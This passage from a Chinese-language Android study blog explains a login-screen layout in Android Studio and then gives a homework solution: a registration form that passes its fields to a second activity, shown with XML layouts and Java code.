<img src="/2026/01/08/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/1.png" class="" title="This is an example image">

<p>我们找到<code>activity_main.xml</code>文件，这个文件在<code>app/res/layout/activity_main.xml</code>,我第一次的时候没有找到这个文件，原因就是我新建的文件不是<code>Empty Views Activity</code>，导致没有这个文件。</p>
<p>创建好之后，我们可以打开<code>Design</code>界面，通过拖拽完成我们的界面。</p>
<img src="/2026/01/08/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/2.png" class="" title="This is an example image">

<p>不知道为什么我没有<code>Exit View</code>，虽然没有，我们也可以在<code>activity_main.xml</code>里面添加。</p>
<p>这里需要注意的是，尽管这个软件是支持拖拽的，但是，我们设计好之后也是需要稍微修改一下的。</p>
<p>我们简单解释一下<code>activity_main.xml</code>里的代码吧（感觉在写html orz）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/main1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 用户名标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/username&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;38dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;150dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;用户名：&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;parent&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 用户名输入框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/TEXT_NAME&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;38dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;10dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">&quot;请输入用户名&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/username&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 密码标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/password&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;38dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;30dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;密码&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/TEXT_NAME&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 密码输入框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/TEST_PASS&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;38dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;10dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">&quot;请输入密码&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:inputType</span>=<span class="string">&quot;textPassword&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/password&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 登录按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/BTN_LOGIN&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;127dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;60dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;登录&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/TEST_PASS&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>用户名标签：</strong><code>TextView</code></p>
<ul>
<li><code>android:id=&quot;@+id/username&quot;</code>：为这个<code>TextView</code>定义一个ID，便于后续在JAVA代码中引用。</li>
<li><code>android:layout_width=&quot;wrap_content&quot;</code>：表示<code>TextView</code>的宽度会根据文本内容自动调整。</li>
<li><code>android:layout_marginStart=&quot;38dp&quot;</code>：为<code>TextView</code>左侧设置<code>38dp</code>的间距。</li>
<li><code>android:layout_marginTop=&quot;150dp&quot;</code>：为<code>TextView</code>顶部设置<code>150dp</code>的间距。</li>
<li><code>android:text=&quot;用户名：&quot;</code>：设置标签文本为<code>用户名：</code></li>
</ul>
<p><strong>用户名输入框：</strong><code>ExitText</code></p>
<ul>
<li><code>android:layout_width=&quot;0dp&quot;</code>：当使用<code>0dp</code>时，意味着宽度由约束决定，这里会根据左右约束（start和end）的定影来确定宽度。</li>
<li><code>android:layout_height=&quot;wrap_content&quot;</code>：高度自适应内容。</li>
<li><code>android:layout_marginStart=&quot;38dp&quot;</code>：左侧有<code>38dp</code>的间距。</li>
<li><code>android:layout_marginTop=&quot;10dp&quot;</code>：顶部与用户名标签之间有10dp的间距。</li>
<li><code>android:hint=&quot;请输入用户名&quot;</code>：显示提示文本。</li>
<li><code>app:layout_constraintEnd_toEndOf=&quot;parent&quot;</code>：将输入框的右视图与父视图对齐。</li>
<li><code>app:layout_constraintStart_toStartOf=&quot;parent&quot;</code>：将输入框的左侧与父视图对齐。</li>
<li><code>app:layout_constraintTop_toBottomOf=&quot;@id/username&quot;</code>：将输入框的顶部与用户名标签的底部对齐。</li>
</ul>
<p>完成之后的界面在上图也可以看见，这里我不再截图了。</p>
<p>在mainactivity中，我们可以看到一个检查函数，当我们输入正确的账号密码时就可以登录成功。</p>
<h4 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a><a href="#2">课后作业</a></h4><p><strong>用AS编写一个包含姓名 年龄 生日 邮箱 兴趣爱好的用户注册页面 要求：点击注册按钮会把注册的信息显示在另一个页面上</strong></p>
<p>根据题目我们可以知道这是2个页面，一个是我们的注册页面，一个是跳转后的显示页面。那就意味着我们需要两个<code>project</code></p>
<p><code>activity_main.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/main&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:padding</span>=<span class="string">&quot;20dp&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/NAME&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;4dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;24dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;姓名：&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">&quot;0.0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">&quot;0.066&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/ET_NAME&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">&quot;输入姓名&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBaseline_toBaselineOf</span>=<span class="string">&quot;@id/NAME&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">&quot;0.0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toEndOf</span>=<span class="string">&quot;@id/NAME&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/AGE&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;4dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;24dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;年龄：&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/ET_NAME&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/ET_AGE&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">&quot;输入年龄&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBaseline_toBaselineOf</span>=<span class="string">&quot;@id/AGE&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toEndOf</span>=<span class="string">&quot;@id/AGE&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/BIRTHDAY&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;4dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;24dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;生日：&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/ET_AGE&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/ET_BIRTHDAY&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">&quot;输入生日&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBaseline_toBaselineOf</span>=<span class="string">&quot;@id/BIRTHDAY&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toEndOf</span>=<span class="string">&quot;@id/BIRTHDAY&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/EMAIL&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;4dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;24dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;邮箱：&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/ET_BIRTHDAY&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/ET_EMAIL&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">&quot;输入邮箱&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBaseline_toBaselineOf</span>=<span class="string">&quot;@+id/EMAIL&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toEndOf</span>=<span class="string">&quot;@id/EMAIL&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/HABIT&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;4dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;24dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;爱好：&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/ET_EMAIL&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/ET_HABIT&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">&quot;输入爱好&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBaseline_toBaselineOf</span>=<span class="string">&quot;@id/HABIT&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toEndOf</span>=<span class="string">&quot;@id/HABIT&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/REGISTER&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;140dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;92dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;注 册&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/ET_HABIT&quot;</span> /&gt;</span></span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>MainActivity.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.selectwork;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// 获取输入框和按钮</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">etName</span> <span class="operator">=</span> findViewById(R.id.ET_NAME);</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">etAge</span> <span class="operator">=</span> findViewById(R.id.ET_AGE);</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">etBirthday</span> <span class="operator">=</span> findViewById(R.id.ET_BIRTHDAY);</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">etEmail</span> <span class="operator">=</span> findViewById(R.id.ET_EMAIL);</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">etHabit</span> <span class="operator">=</span> findViewById(R.id.ET_HABIT);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">registerButton</span> <span class="operator">=</span> findViewById(R.id.REGISTER);</span><br><span class="line">        <span class="comment">// 注册按钮点击事件</span></span><br><span class="line">        registerButton.setOnClickListener(v -&gt; &#123;</span><br><span class="line">            <span class="comment">// 获取用户输入的数据</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> etName.getText().toString();</span><br><span class="line">            <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> etAge.getText().toString();</span><br><span class="line">            <span class="type">String</span> <span class="variable">birthday</span> <span class="operator">=</span> etBirthday.getText().toString();</span><br><span class="line">            <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> etEmail.getText().toString();</span><br><span class="line">            <span class="type">String</span> <span class="variable">habit</span> <span class="operator">=</span> etHabit.getText().toString();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建Intent并传递数据</span></span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>, ResultActivity.class);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;NAME&quot;</span>, name);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;AGE&quot;</span>, age);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;BIRTHDAY&quot;</span>, birthday);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;EMAIL&quot;</span>, email);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;HABIT&quot;</span>, habit);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 启动ResultActivity</span></span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;);</span><br><span class="line">        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -&gt; &#123;</span><br><span class="line">            <span class="type">Insets</span> <span class="variable">systemBars</span> <span class="operator">=</span> insets.getInsets(WindowInsetsCompat.Type.systemBars());</span><br><span class="line">            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);</span><br><span class="line">            <span class="keyword">return</span> insets;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>activity_result.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/main&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.ResultActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/resultTextView&quot;</span></span></span><br><span class="line"><span class="tag">        <span 